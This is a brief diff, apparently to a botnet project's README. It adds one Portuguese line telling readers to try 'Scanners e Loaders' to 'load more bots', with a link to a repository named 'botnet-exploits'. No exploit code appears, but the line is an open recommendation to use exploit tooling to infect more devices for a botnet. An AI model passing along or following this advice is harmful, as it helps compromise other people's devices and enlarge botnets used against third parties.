@@ -9,6 +9,8 @@
 
 </div>
 
+> Tente usar <a href="https://github.com/CirqueiraDev/botnet-exploits">Scanners e Loaders</a> para carregar mais bots.
+
 ---
 
 <div align="center">
